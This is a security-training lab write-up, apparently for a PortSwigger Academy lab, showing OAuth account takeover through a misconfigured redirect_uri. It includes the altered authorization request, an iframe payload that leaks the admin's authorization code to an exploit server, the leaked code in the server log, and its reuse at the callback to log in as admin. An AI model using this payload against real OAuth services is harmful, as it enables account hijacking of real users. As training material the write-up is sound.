## OAuth account hijacking via redirect_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- OAuth Server Domain
- /admin
- /social-login
- /oauth-callback

## Resume

1. Log in and complete OAuth flow normally  
2. Observe that session persists after logout/login  
3. Identify `/auth?client_id=...` authorization request  
4. Modify `redirect_uri` to attacker-controlled exploit server  
5. Leak authorization code via server logs  
6. Use stolen code to complete OAuth login  
7. Access admin panel and delete `carlos`

## Solve

The vulnerable request is:

```http
GET /auth?client_id=o65ypjyonk6qb01d43yub&redirect_uri=https://oauth-0ad700ab03270a0181a541c402e80054.oauth-server.net/callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ad700ab03270a0181a541c402e80054.oauth-server.net
```

We modify it in Burp Repeater by changing the `redirect_uri` to the exploit server:

```text
https://exploit-0ac600dc036c0a18819b42d10175008b.exploit-server.net
```

We then force the victim to trigger the OAuth flow via an iframe:

```html id="iframe_oauth_leak"
<iframe src="https://oauth-0ad700ab03270a0181a541c402e80054.oauth-server.net/auth?client_id=o65ypjyonk6qb01d43yub&redirect_uri=https://exploit-0ac600dc036c0a18819b42d10175008b.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

When the victim loads this page:

- OAuth server redirects to attacker-controlled `redirect_uri`
- Authorization code is sent to exploit server logs


From the exploit server access log:

```text
10.0.3.10 2026-05-22 10:49:07 +0000 "GET /?code=DeOL9MkXyUip7AU9-cS04FTkgbX62hlfcRKOjWhCM5r HTTP/1.1" 200 "Victim browser request"
```

Stolen code:

```text
DeOL9MkXyUip7AU9-cS04FTkgbX62hlfcRKOjWhCM5r
```


Use the stolen code in the callback endpoint:

```text
https://0af70057035a0a5f815a43d0002b0002.web-security-academy.net/oauth-callback?code=DeOL9MkXyUip7AU9-cS04FTkgbX62hlfcRKOjWhCM5r
```

This completes the OAuth flow and logs you in as the admin user.
